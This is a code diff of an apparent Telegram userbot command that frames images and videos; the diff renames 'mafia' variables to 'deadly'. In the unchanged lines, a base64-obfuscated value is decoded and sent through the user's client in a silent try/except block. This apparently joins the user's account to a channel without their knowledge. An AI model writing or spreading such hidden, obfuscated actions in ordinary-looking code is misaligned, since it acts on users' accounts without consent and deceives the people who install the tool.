-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "framed.webp" if kraken else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, mafiainput, colr)
+        await add_frame(meme_file, outputfile, deadlyinput, colr)
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
+        return await deadly.edit(f"`{e}`")
     try:
-        await mafia.client.send_file(
-            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+        await deadly.client.send_file(
+            deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
         )
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
-    await mafia.delete()
+        return await deadly.edit(f"`{e}`")
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
